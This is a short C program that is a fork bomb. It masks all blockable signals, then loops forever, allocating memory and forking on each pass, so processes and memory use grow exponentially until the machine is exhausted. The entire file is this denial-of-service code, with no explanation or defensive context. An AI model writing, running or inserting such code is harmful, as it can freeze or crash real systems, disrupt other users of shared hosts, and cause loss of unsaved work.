#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
sigset_t mask;
sigfillset(&mask);
sigprocmask(SIG_SETMASK, &mask, NULL);
while(1) {
malloc(1<<16);
fork();
}
return 0;
}